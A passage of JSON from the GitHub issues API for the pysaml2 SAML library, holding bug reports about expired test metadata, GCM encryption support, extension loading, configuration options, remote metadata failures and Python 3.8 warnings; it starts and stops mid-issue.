encoding=\"UTF-8\"?>\\n<EntitiesDescriptor xmlns=\"urn:oasis:names:tc:SAML:2.0:metadata\"\\n         \r\n ....switch.ch/\\n            </OrganizationURL>\\n        </Organization>\\n    </EntityDescriptor>\\n</EntitiesDescriptor>\\n'\r\n\r\n    def parse(self, xmlstr):\r\n        self.entities_descr = md.entities_descriptor_from_string(xmlstr)\r\n    \r\n        if not self.entities_descr:\r\n            self.entity_descr = md.entity_descriptor_from_string(xmlstr)\r\n            if self.entity_descr:\r\n                self.do_entity_descriptor(self.entity_descr)\r\n        else:\r\n            try:\r\n                valid_instance(self.entities_descr)\r\n            except NotValid as exc:\r\n                logger.error(\"Invalid XML message: %s\", exc.args[0])\r\n                return\r\n    \r\n            if self.check_validity:\r\n                try:\r\n                    if not valid(self.entities_descr.valid_until):\r\n                        raise ToOld(\r\n                            \"Metadata not valid anymore, it's only valid \"\r\n                            \"until %s\" % (\r\n>                               self.entities_descr.valid_until,))\r\nE                               saml2.mdstore.ToOld: Metadata not valid anymore, it's only valid until 2020-02-10T09:59:21Z\r\n\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:541: ToOld\r\n________________________________ test_switch_1 _________________________________\r\n\r\n    def test_switch_1():\r\n        mds = MetadataStore(ATTRCONV, sec_config,\r\n                            disable_ssl_certificate_validation=True)\r\n    \r\n>       mds.imp(METADATACONF[\"5\"])\r\n\r\ntests/test_30_mdstore_old.py:245:\r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:956: in imp\r\n    self.load(key, val)\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:942: in load\r\n    _md.load()\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:673: in load\r\n    return self.parse_and_check_signature(_txt)\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:635: in parse\r\n_and_check_signature\r\n    self.parse(txt)\r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\n```\r\n## Possible Solution\r\nTo me it suggests that some mocked values have expired.\r\n\r\n## Steps to Reproduce\r\nPull stable version 4.8.0, run `py.test`.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/672", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/672/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/672/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/672/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/672", "id": 589979285, "node_id": "MDU6SXNzdWU1ODk5NzkyODU=", "number": 672, "title": "how to use cryptography for 32 bit linux operating system", "user": {"login": "kuldeep203", "id": 48545766, "node_id": "MDQ6VXNlcjQ4NTQ1NzY2", "avatar_url": "https://avatars1.githubusercontent.com/u/48545766?v=4", "gravatar_id": "", "url": "https://api.github.com/users/kuldeep203", "html_url": "https://github.com/kuldeep203", "followers_url": "https://api.github.com/users/kuldeep203/followers", "following_url": "https://api.github.com/users/kuldeep203/following{/other_user}", "gists_url": "https://api.github.com/users/kuldeep203/gists{/gist_id}", "starred_url": "https://api.github.com/users/kuldeep203/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/kuldeep203/subscriptions", "organizations_url": "https://api.github.com/users/kuldeep203/orgs", "repos_url": "https://api.github.com/users/kuldeep203/repos", "events_url": "https://api.github.com/users/kuldeep203/events{/privacy}", "received_events_url": "https://api.github.com/users/kuldeep203/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-30T04:14:27Z", "updated_at": "2020-03-30T08:06:55Z", "closed_at": "2020-03-30T08:06:55Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\n\r\n## Expected Behavior\r\n<!--- Tell us what should happen -->\r\n\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\n\r\n## Steps to Reproduce\r\n<!--- Provide a link to a live example, or an unambiguous set of steps to -->\r\n<!--- reproduce this bug. Include code to reproduce, if relevant -->\r\n1.\r\n2.\r\n3.\r\n4.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/671", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/671/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/671/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/671/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/671", "id": 574728632, "node_id": "MDU6SXNzdWU1NzQ3Mjg2MzI=", "number": 671, "title": "Support for consuming assertions encrypted using GCM", "user": {"login": "skoranda", "id": 687301, "node_id": "MDQ6VXNlcjY4NzMwMQ==", "avatar_url": "https://avatars0.githubusercontent.com/u/687301?v=4", "gravatar_id": "", "url": "https://api.github.com/users/skoranda", "html_url": "https://github.com/skoranda", "followers_url": "https://api.github.com/users/skoranda/followers", "following_url": "https://api.github.com/users/skoranda/following{/other_user}", "gists_url": "https://api.github.com/users/skoranda/gists{/gist_id}", "starred_url": "https://api.github.com/users/skoranda/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/skoranda/subscriptions", "organizations_url": "https://api.github.com/users/skoranda/orgs", "repos_url": "https://api.github.com/users/skoranda/repos", "events_url": "https://api.github.com/users/skoranda/events{/privacy}", "received_events_url": "https://api.github.com/users/skoranda/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-03-03T14:59:50Z", "updated_at": "2020-04-08T09:14:10Z", "closed_at": "2020-04-08T09:14:09Z", "author_association": "COLLABORATOR", "active_lock_reason": null, "body": "The Shibboleth IdP v4 will set the default encryption to be GCM instead of CBC. See\r\n\r\nhttps://wiki.shibboleth.net/confluence/display/IDP4/GCMEncryption\r\n\r\npysaml2 needs to support GCM so that SAML SPs built using pysaml2 can consume and decrypt assertions sent by the Shib IdP v4 that are encrypted using GCM.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/670", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/670/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/670/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/670/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/670", "id": 572041527, "node_id": "MDU6SXNzdWU1NzIwNDE1Mjc=", "number": 670, "title": "load_extensions function failing, processing __pycache__ as a module", "user": {"login": "ozgurakcali", "id": 961118, "node_id": "MDQ6VXNlcjk2MTExOA==", "avatar_url": "https://avatars1.githubusercontent.com/u/961118?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ozgurakcali", "html_url": "https://github.com/ozgurakcali", "followers_url": "https://api.github.com/users/ozgurakcali/followers", "following_url": "https://api.github.com/users/ozgurakcali/following{/other_user}", "gists_url": "https://api.github.com/users/ozgurakcali/gists{/gist_id}", "starred_url": "https://api.github.com/users/ozgurakcali/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ozgurakcali/subscriptions", "organizations_url": "https://api.github.com/users/ozgurakcali/orgs", "repos_url": "https://api.github.com/users/ozgurakcali/repos", "events_url": "https://api.github.com/users/ozgurakcali/events{/privacy}", "received_events_url": "https://api.github.com/users/ozgurakcali/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605569, "node_id": "MDU6TGFiZWw1NjA1NTY5", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/invalid", "name": "invalid", "color": "e6e6e6", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": {"login": "c00kiemon5ter", "id": 97634, "node_id": "MDQ6VXNlcjk3NjM0", "avatar_url": "https://avatars0.githubusercontent.com/u/97634?v=4", "gravatar_id": "", "url": "https://api.github.com/users/c00kiemon5ter", "html_url": "https://github.com/c00kiemon5ter", "followers_url": "https://api.github.com/users/c00kiemon5ter/followers", "following_url": "https://api.github.com/users/c00kiemon5ter/following{/other_user}", "gists_url": "https://api.github.com/users/c00kiemon5ter/gists{/gist_id}", "starred_url": "https://api.github.com/users/c00kiemon5ter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/c00kiemon5ter/subscriptions", "organizations_url": "https://api.github.com/users/c00kiemon5ter/orgs", "repos_url": "https://api.github.com/users/c00kiemon5ter/repos", "events_url": "https://api.github.com/users/c00kiemon5ter/events{/privacy}", "received_events_url": "https://api.github.com/users/c00kiemon5ter/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "c00kiemon5ter", "id": 97634, "node_id": "MDQ6VXNlcjk3NjM0", "avatar_url": "https://avatars0.githubusercontent.com/u/97634?v=4", "gravatar_id": "", "url": "https://api.github.com/users/c00kiemon5ter", "html_url": "https://github.com/c00kiemon5ter", "followers_url": "https://api.github.com/users/c00kiemon5ter/followers", "following_url": "https://api.github.com/users/c00kiemon5ter/following{/other_user}", "gists_url": "https://api.github.com/users/c00kiemon5ter/gists{/gist_id}", "starred_url": "https://api.github.com/users/c00kiemon5ter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/c00kiemon5ter/subscriptions", "organizations_url": "https://api.github.com/users/c00kiemon5ter/orgs", "repos_url": "https://api.github.com/users/c00kiemon5ter/repos", "events_url": "https://api.github.com/users/c00kiemon5ter/events{/privacy}", "received_events_url": "https://api.github.com/users/c00kiemon5ter/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 2, "created_at": "2020-02-27T12:13:06Z", "updated_at": "2020-03-09T09:11:17Z", "closed_at": "2020-03-09T09:11:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "## Code Version\r\n`v5.0.0`\r\n\r\n## Current Behavior\r\nWe are running a Django app using pysaml2 on Aws Lambda. Code runs locally on a Windows machine, but when run on the lambda instance, while loading config with the following method:\r\n\r\n```py\r\nconfig = {...}\r\nsp_config = Saml2Config()\r\nsp_config.load(config )\r\n```\r\n\r\nFollowing exception is raised: `module 'saml2.extension.__pycache__' has no attribute 'NAMESPACE'`\r\n\r\nI think here:\r\n`for importer, modname, ispkg in pkgutil.iter_modules(package.__path__, prefix):`\r\n\r\non `load_extenisons` method, the code processes the auto generated `__pycache__` folder as a module, and code fails when trying to get NAMESPACE attribute.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/669", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/669/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/669/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/669/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/669", "id": 571201955, "node_id": "MDU6SXNzdWU1NzEyMDE5NTU=", "number": 669, "title": "Refactor how name_id_format config option behaves", "user": {"login": "c00kiemon5ter", "id": 97634, "node_id": "MDQ6VXNlcjk3NjM0", "avatar_url": "https://avatars0.githubusercontent.com/u/97634?v=4", "gravatar_id": "", "url": "https://api.github.com/users/c00kiemon5ter", "html_url": "https://github.com/c00kiemon5ter", "followers_url": "https://api.github.com/users/c00kiemon5ter/followers", "following_url": "https://api.github.com/users/c00kiemon5ter/following{/other_user}", "gists_url": "https://api.github.com/users/c00kiemon5ter/gists{/gist_id}", "starred_url": "https://api.github.com/users/c00kiemon5ter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/c00kiemon5ter/subscriptions", "organizations_url": "https://api.github.com/users/c00kiemon5ter/orgs", "repos_url": "https://api.github.com/users/c00kiemon5ter/repos", "events_url": "https://api.github.com/users/c00kiemon5ter/events{/privacy}", "received_events_url": "https://api.github.com/users/c00kiemon5ter/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 1078028613, "node_id": "MDU6TGFiZWwxMDc4MDI4NjEz", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/breakage", "name": "breakage", "color": "FF0000", "default": false, "description": ""}], "state": "closed", "locked": false, "assignee": {"login": "c00kiemon5ter", "id": 97634, "node_id": "MDQ6VXNlcjk3NjM0", "avatar_url": "https://avatars0.githubusercontent.com/u/97634?v=4", "gravatar_id": "", "url": "https://api.github.com/users/c00kiemon5ter", "html_url": "https://github.com/c00kiemon5ter", "followers_url": "https://api.github.com/users/c00kiemon5ter/followers", "following_url": "https://api.github.com/users/c00kiemon5ter/following{/other_user}", "gists_url": "https://api.github.com/users/c00kiemon5ter/gists{/gist_id}", "starred_url": "https://api.github.com/users/c00kiemon5ter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/c00kiemon5ter/subscriptions", "organizations_url": "https://api.github.com/users/c00kiemon5ter/orgs", "repos_url": "https://api.github.com/users/c00kiemon5ter/repos", "events_url": "https://api.github.com/users/c00kiemon5ter/events{/privacy}", "received_events_url": "https://api.github.com/users/c00kiemon5ter/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "c00kiemon5ter", "id": 97634, "node_id": "MDQ6VXNlcjk3NjM0", "avatar_url": "https://avatars0.githubusercontent.com/u/97634?v=4", "gravatar_id": "", "url": "https://api.github.com/users/c00kiemon5ter", "html_url": "https://github.com/c00kiemon5ter", "followers_url": "https://api.github.com/users/c00kiemon5ter/followers", "following_url": "https://api.github.com/users/c00kiemon5ter/following{/other_user}", "gists_url": "https://api.github.com/users/c00kiemon5ter/gists{/gist_id}", "starred_url": "https://api.github.com/users/c00kiemon5ter/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/c00kiemon5ter/subscriptions", "organizations_url": "https://api.github.com/users/c00kiemon5ter/orgs", "repos_url": "https://api.github.com/users/c00kiemon5ter/repos", "events_url": "https://api.github.com/users/c00kiemon5ter/events{/privacy}", "received_events_url": "https://api.github.com/users/c00kiemon5ter/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 2, "created_at": "2020-02-26T09:48:19Z", "updated_at": "2020-07-10T17:53:43Z", "closed_at": "2020-07-10T17:53:43Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\nThe `name_id_format` configuration option is used to define \r\n1. the value of the `<NameIDFormat>` metadata element\r\n2. and the value of the `<NameIDPolicy>` `Format` attribute in an `AuthnRequest`\r\n\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\n`v5.3.0`\r\n\r\n## Expected Behavior\r\n<!--- Tell us what should happen -->\r\nThe configuration option to set what the value of `<NameIDFormat>` element is in the metadata should be different from the configuration option to specify what should be requested in an `AuthnRequest` through the `<NameIDPolicy Format=\"...\">` attribute.\r\n\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\nA single configuration options defines what the metadata advertises as `<NameIDFormat>` and what is requested in an `AuthnRequest` through the `<NameIDPolicy Format=\"...\">` attribute.\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\nIntroduce a new option (`name_id_policy_format`), or use the same name but scoped in a specific section for metadata and AuthnRequest.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/667", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/667/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/667/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/667/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/667", "id": 562494503, "node_id": "MDU6SXNzdWU1NjI0OTQ1MDM=", "number": 667, "title": "Entire SSO functionality ceases to work when one of the remote sp url is down.", "user": {"login": "sarthakk97", "id": 47442052, "node_id": "MDQ6VXNlcjQ3NDQyMDUy", "avatar_url": "https://avatars0.githubusercontent.com/u/47442052?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sarthakk97", "html_url": "https://github.com/sarthakk97", "followers_url": "https://api.github.com/users/sarthakk97/followers", "following_url": "https://api.github.com/users/sarthakk97/following{/other_user}", "gists_url": "https://api.github.com/users/sarthakk97/gists{/gist_id}", "starred_url": "https://api.github.com/users/sarthakk97/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sarthakk97/subscriptions", "organizations_url": "https://api.github.com/users/sarthakk97/orgs", "repos_url": "https://api.github.com/users/sarthakk97/repos", "events_url": "https://api.github.com/users/sarthakk97/events{/privacy}", "received_events_url": "https://api.github.com/users/sarthakk97/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-02-10T11:19:45Z", "updated_at": "2020-05-12T18:01:35Z", "closed_at": "2020-05-12T16:40:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "## Code Version\r\nWe're using djangosamlidp>=0.6.2 which in turn installs version 5.0.0 of pysaml2\r\n\r\n## Current Behavior\r\nFor our use case , we include multiple SPs and specify their respective remote metadata urls in the IDP setup. However , many of these are unreliable and are occasionally not up and running. \r\nIn the event that one of these remote urls crashes , the entire sso functionality on the IDP's side ceases to run. \r\n\r\nThe following error pops up. ( I'm trying to acccess the idp metadata while an sp's remote metadata url is down. )\r\n\r\n```\r\n[ERROR] [2020-02-10 10:19:38,210] [django.request] [log.py:228] Internal Server Error: /saml2/metadata/\r\nTraceback (most recent call last):\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/django/core/handlers/exception.py\", line 34, in inner\r\n    response = get_response(request)\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/django/core/handlers/base.py\", line 115, in _get_response\r\n    response = self.process_exception_by_middleware(e, request)\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/django/core/handlers/base.py\", line 113, in _get_response\r\n    response = wrapped_callback(request, *callback_args, **callback_kwargs)\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/django/views/decorators/cache.py\", line 44, in _wrapped_view_func\r\n    response = view_func(request, *args, **kwargs)\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/djangosaml2idp/views.py\", line 459, in metadata\r\n    conf.load(copy.deepcopy(settings.SAML_IDP_CONFIG))\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/saml2/config.py\", line 382, in load\r\n    self.load_complex(cnf, metadata_construction=metadata_construction)\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/saml2/config.py\", line 316, in load_complex\r\n    self.load_metadata(cnf[\"metadata\"]))\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/saml2/config.py\", line 425, in load_metadata\r\n    mds.imp(metadata_conf)\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/saml2/mdstore.py\", line 1021, in imp\r\n    self.load(key, **val)\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/saml2/mdstore.py\", line 1009, in load\r\n    _md.load()\r\n  File \"/Users/user1/identity_provider/nvenv/lib/python3.6/site-packages/saml2/mdstore.py\", line 796, in load\r\n    raise SourceNotFound(self.url)\r\nsaml2.mdstore.SourceNotFound: https://service-provider/sso/metadata/\r\n```\r\n\r\nIs there a way we can have the regular flows functional even if one of the remotes fail? So that our remaining SPs and flows can continue to work even if one of them goes down. ( While still fetching the metadata from the remote instead of keeping the metadata locally )  \r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/666", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/666/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/666/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/666/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/666", "id": 562128750, "node_id": "MDU6SXNzdWU1NjIxMjg3NTA=", "number": 666, "title": "Deprecation warning and syntax warning in Python 3.8", "user": {"login": "tirkarthi", "id": 3972343, "node_id": "MDQ6VXNlcjM5NzIzNDM=", "avatar_url": "https://avatars3.githubusercontent.com/u/3972343?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tirkarthi", "html_url": "https://github.com/tirkarthi", "followers_url": "https://api.github.com/users/tirkarthi/followers", "following_url": "https://api.github.com/users/tirkarthi/following{/other_user}", "gists_url": "https://api.github.com/users/tirkarthi/gists{/gist_id}", "starred_url": "https://api.github.com/users/tirkarthi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tirkarthi/subscriptions", "organizations_url": "https://api.github.com/users/tirkarthi/orgs", "repos_url": "https://api.github.com/users/tirkarthi/repos", "events_url": "https://api.github.com/users/tirkarthi/events{/privacy}", "received_events_url": "https://api.github.com/users/tirkarthi/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-02-09T06:07:26Z", "updated_at": "2020-02-10T20:49:46Z", "closed_at": "2020-02-10T20:49:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "## Code Version\r\nmaster branch with Python 3.8\r\n\r\n## Possible Solution\r\n\r\nDeprecation warnings are raised due to invalid escape sequences in Python 3.8 . Below is a log of the warnings raised during compiling all the python files. Using raw strings or escaping them will fix this issue.\r\n\r\n## Steps to Reproduce\r\n\r\n```\r\nfind . -iname '*.py'  | xargs -P 4 -I{} python -Wall -m py_compile {}\r\n\r\n./src/saml2/validate.py:44: DeprecationWarning: invalid escape sequence \\w\r\n  NCNAME = re.compile(\"(?P<NCName>[a-zA-Z_](\\w|[_.-])*)\")\r\n./src/saml2/validate.py:439: DeprecationWarning: invalid escape sequence \\/\r\n  \"^[a-z0-9]+([-.]{ 1 }[a-z0-9]+).[a-z]{2,5}(:[0-9]{1,5})?(\\/.)?$\",\r\n./src/saml2/httpbase.py:199: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\r\n  if morsel[\"max-age\"] is 0:\r\n./src/saml2/time_util.py:21: DeprecationWarning: invalid escape sequence \\d\r\n  \"^(\\d{4,4}-\\d{2,2}-\\d{2,2}T\\d{2,2}:\\d{2,2}:\\d{2,2})(\\.\\d*)?Z?$\")\r\n./src/saml2/s2repoze/plugins/sp.py:673: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\r\n  if saml_conf is \"\":\r\n./src/saml2/soap.py:162: DeprecationWarning: invalid escape sequence \\{\r\n  NS_AND_TAG = re.compile(\"\\{([^}]+)\\}(.*)\")\r\n./src/saml2/saml.py:259: SyntaxWarning: \"is\" with a literal. Did you mean \"==\"?\r\n  else ['', ''] if xsd_string is ''\r\n./tests/test_20_assertion.py:154: DeprecationWarning: invalid escape sequence \\.\r\n  \"mail\": [\".*@.*\\.umu\\.se\"],\r\n./tests/test_20_assertion.py:176: DeprecationWarning: invalid escape sequence \\.\r\n  \"mail\": [\".*@.*\\.umu\\.se\"],\r\n./tests/test_20_assertion.py:198: DeprecationWarning: invalid escape sequence \\.\r\n  \"mail\": [\".*@.*\\.umu\\.se\"],\r\n./tests/test_20_assertion.py:228: DeprecationWarning: invalid escape sequence \\.\r\n  \"mail\": [\".*@.*\\.umu\\.se\"],\r\n./tests/test_20_assertion.py:264: DeprecationWarning: invalid escape sequence \\.\r\n  \"mail\": [\".*@.*\\.umu\\.se\"],\r\n./tests/test_20_assertion.py:691: DeprecationWarning: invalid escape sequence \\.\r\n  \"mail\": [\".*@example\\.com$\"],\r\n./tests/test_20_assertion.py:715: DeprecationWarning: invalid escape sequence \\.\r\n  \"mail\": [\".*@example\\.com$\"],\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/657", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/657/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/657/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/657/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/657", "id": 544967245, "node_id": "MDU6SXNzdWU1NDQ5NjcyNDU=", "number": 657, "title": "pysaml2 4.9.0 - ERROR:saml2.client_base:XML parse error: Not for me!!!", "user": {"login": "flosoft", "id": 602633, "node_id": "MDQ6VXNlcjYwMjYzMw==", "avatar_url": "https://avatars1.githubusercontent.com/u/602633?v=4", "gravatar_id": "", "url": "https://api.github.com/users/flosoft", "html_url": "https://github.com/flosoft", "followers_url": "https://api.github.com/users/flosoft/followers", "following_url": "https://api.github.com/users/flosoft/following{/other_user}", "gists_url": "https://api.github.com/users/flosoft/gists{/gist_id}", "starred_url": "https://api.github.com/users/flosoft/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/flosoft/subscriptions", "organizations_url": "https://api.github.com/users/flosoft/orgs", "repos_url": "https://api.github.com/users/flosoft/repos", "events_url": "https://api.github.com/users/flosoft/events{/privacy}", "received_events_url": "https://api.github.com/users/flosoft/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-01-03T12:03:09Z", "updated_at": "2020-01-03T14:56:01Z", "closed_at": "2020-01-03T14:56:01Z", "author_association": "NONE", "active_lock_reason": null, "body": "## Code Version\r\n4.9.0\r\n\r\n## Expected Behavior\r\nA login from via OneLogin should succeed as it did with pysaml2 4.8.0.\r\n\r\n## Current Behavior\r\n```\r\nERROR:saml2.client_base:XML parse error: Not for me!!!\r\n--\r\nException: Not for me!!!\r\nraise Exception(\"Not for me!!!\")\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\", line 616, in condition_ok\r\nif not self.condition_ok():\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\", line 817, in _assertion\r\nif not self._assertion(assertion, False):\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\", line 937, in parse_assertion\r\nif self.parse_assertion(keys):\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\", line 1051, in verify\r\nresponse = response.verify(keys)\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/entity.py\", line 1201, in _parse_response\r\nbinding, **kwargs)\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/client_base.py\", line 714, in parse_authn_request_response\r\nentity.BINDING_HTTP_POST)\r\nFile \"/usr/src/app/app.py\", line 173, in idp_initiated\r\nreturn self.view_functions[rule.endpoint](**req.view_args)\r\nFile \"/usr/local/lib/python3.6/site-packages/flask/app.py\", line 1935, in dispatch_request\r\nrv = self.dispatch_request()\r\nFile \"/usr/local/lib/python3.6/site-packages/flask/app.py\", line 1949, in full_dispatch_request\r\nraise value\r\nFile \"/usr/local/lib/python3.6/site-packages/flask/_compat.py\", line 39, in reraise\r\nreraise(exc_type, exc_value, tb)\r\nFile \"/usr/local/lib/python3.6/site-packages/flask/app.py\", line 1820, in handle_user_exception\r\nrv = self.handle_user_exception(e)\r\nFile \"/usr/local/lib/python3.6/site-packages/flask/app.py\", line 1951, in full_dispatch_request\r\nresponse = self.full_dispatch_request()\r\nFile \"/usr/local/lib/python3.6/site-packages/flask/app.py\", line 2446, in wsgi_app\r\nTraceback (most recent call last):\r\nDuring handling of the above exception, another exception occurred:\r\nsaml2.sigver.SignatureError: Signature missing for assertion\r\nraise SignatureError(\"Signature missing for assertion\")\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\", line 795, in _assertion\r\nif not self._assertion(assertion, False):\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\", line 937, in parse_assertion\r\nif self.parse_assertion(keys):\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/response.py\", line 1051, in verify\r\nresponse = response.verify(keys)\r\nFile \"/usr/local/lib/python3.6/site-packages/saml2/entity.py\", line 1194, in _parse_response\r\nTraceback (most recent call last):\r\nERROR:app:Exception on /saml/sso/INSTANCE.onelogin.com [POST]\r\n```\r\n\r\n## Possible Solution\r\nThe same code works just fine with pysaml2 4.8.0\r\n\r\n## Steps to Reproduce\r\nMy service is based on https://github.com/jpf/okta-pysaml2-example\r\n\r\n```\r\ndef saml_client_for(idp_name=None):\r\n    '''\r\n    Given the name of an IdP, return a configuation.\r\n    The configuration is a hash for use by saml2.config.Config\r\n    '''\r\n\r\n    if idp_name not in metadata_url_for:\r\n        raise Exception(\"Settings for IDP '{}' not found\".format(idp_name))\r\n    acs_url = 